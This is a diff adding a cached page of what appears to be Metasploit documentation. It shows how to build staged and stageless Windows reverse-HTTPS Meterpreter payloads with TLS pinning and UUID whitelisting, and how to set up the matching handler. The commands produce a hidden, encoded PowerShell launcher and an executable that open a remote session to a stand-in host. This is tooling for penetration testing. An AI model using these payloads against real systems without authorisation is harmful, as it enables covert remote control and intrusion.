@@ -1,0 +1,50 @@
+I"h<p>In some scenarios, it pays to be paranoid. This also applies to generating and handling Meterpreter sessions. This document walks through the process of implementing a paranoid Meterpreter payload and listener.</p>
+
+<h3 id="create-a-ssltls-certificate">Create a SSL/TLS Certificate</h3>
+
+<p>For best results, use a SSL/TLS certificate signed by a trusted certificate authority. Failing that, you can still generate a self-signed unified PEM using the following command:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
+    -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" \
+    -keyout www.example.com.key \
+    -out www.example.com.crt &amp;&amp; \
+cat www.example.com.key  www.example.com.crt &gt; www.example.com.pem &amp;&amp; \
+rm -f www.example.com.key  www.example.com.crt
+</code></pre></div></div>
+
+<h3 id="create-a-paranoid-payload">Create a Paranoid Payload</h3>
+
+<p>For this use case, we will combine [[Payload UUID]] tracking and whitelisting with <a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-HTTP-Communication#tls-certificate-pinning">TLS pinning</a>. For a staged payload, we will use the following command:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./msfvenom -p windows/meterpreter/reverse_winhttps LHOST=www.example.com LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./www.example.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f psh-cmd -o launch-paranoid.bat
+
+$ head launch-paranoid.bat 
+%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcg...
+</code></pre></div></div>
+
+<table>
+  <tbody>
+    <tr>
+      <td>A [[stageless</td>
+      <td>Meterpreter Stageless Mode]] version of this would look like the following:</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./msfvenom -p windows/meterpreter_reverse_https LHOST=www.example.com LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./www.example.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless -f exe -o launch-paranoid-stageless.exe
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 885314 bytes
+Saved as: launch-paranoid-stageless.exe
+</code></pre></div></div>
+
+<h3 id="create-a-paranoid-listener">Create a Paranoid Listener</h3>
+
+<p>A staged payload would need to set the <code class="highlighter-rouge">HandlerSSLCert</code> and <code class="highlighter-rouge">StagerVerifySSLCert</code> options to enable TLS pinning and <code class="highlighter-rouge">IgnoreUnknownPayloads</code> to whitelist registered payload UUIDs:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_winhttps; set LHOST www.example.com; set LPORT 443; set HandlerSSLCert ./www.example.com.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j'
+</code></pre></div></div>
+
+<p>A stageless version is only slightly different:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_https; set LHOST www.example.com; set LPORT 443; set HandlerSSLCert ./www.example.com.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j'
+</code></pre></div></div>
+:ET
